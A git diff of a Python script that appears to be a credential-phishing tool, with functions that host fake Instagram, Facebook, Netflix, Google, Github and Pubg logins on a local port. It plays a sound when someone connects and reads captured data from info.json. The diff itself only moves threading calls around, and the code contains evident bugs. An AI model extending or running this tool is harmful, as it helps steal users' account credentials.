@@ -18,6 +18,7 @@ except ImportError or ModuleNotFoundError:
     if install.lower == "y" or install.upper == "y":
         os.system("pip3 install colorama , playsound , pandas , keyboard , pywin32")
         sleep(0.5)
+        pass
     else:
         exit(Fore.GREEN + "have a good day".title())
 
@@ -114,6 +115,7 @@ def instagram():
     path = os.getcwd()
     os.chdir(rf"{path}\instagram")
 
+
 #====================================================================================================
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):".title() + Fore.RESET)
@@ -128,6 +130,7 @@ def instagram():
     loaclhost()
 
     sleep(8)
+
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
@@ -144,12 +147,12 @@ def instagram():
                 #play sound
                 os.chdir(r"..\Voice")
                 sound = playsound("T_connected.mp3")
+                t = threading.Thread(target=sound)
+                t.start()
                 sleep(0.5)
                 os.chdir(fr"{path}\instagram")
                 sleep(0.5)
 
-                t = threading.Thread(target=sound)
-                t.start()
                 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -258,12 +261,12 @@ def facebook():
                 #play sound
                 os.chdir(r"..\Voice")
                 sound = playsound("T_connected.mp3")
+                t = threading.Thread(target=sound)
+                t.start()
                 sleep(0.5)
                 os.chdir(fr"{path}\facebook")
                 sleep(0.5)
 
-                t = threading.Thread(target=sound)
-                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -372,12 +375,12 @@ def netflix():
                 #play sound
                 os.chdir(r"..\Voice")
                 sound = playsound("T_connected.mp3")
+                t = threading.Thread(target=sound)
+                t.start()
                 sleep(0.5)
                 os.chdir(fr"{path}\Netflix")
                 sleep(0.5)
 
-                t = threading.Thread(target=sound)
-                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -486,12 +489,12 @@ def Google():
                 #play sound
                 os.chdir(r"..\Voice")
                 sound = playsound("T_connected.mp3")
+                t = threading.Thread(target=sound)
+                t.start()
                 sleep(0.5)
                 os.chdir(fr"{path}\Google")
                 sleep(0.5)
 
-                t = threading.Thread(target=sound)
-                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -602,12 +605,12 @@ def Github():
                 #play sound
                 os.chdir(r"..\Voice")
                 sound = playsound("T_connected.mp3")
+                t = threading.Thread(target=sound)
+                t.start()
                 sleep(0.5)
                 os.chdir(fr"{path}\Github")
                 sleep(0.5)
 
-                t = threading.Thread(target=sound)
-                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
@@ -717,12 +720,12 @@ def Pubg():
                 #play sound
                 os.chdir(r"..\Voice")
                 sound = playsound("T_connected.mp3")
+                t = threading.Thread(target=sound)
+                t.start()
                 sleep(0.5)
                 os.chdir(fr"{path}\Pubg")
                 sleep(0.5)
 
-                t = threading.Thread(target=sound)
-                t.start()
 
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
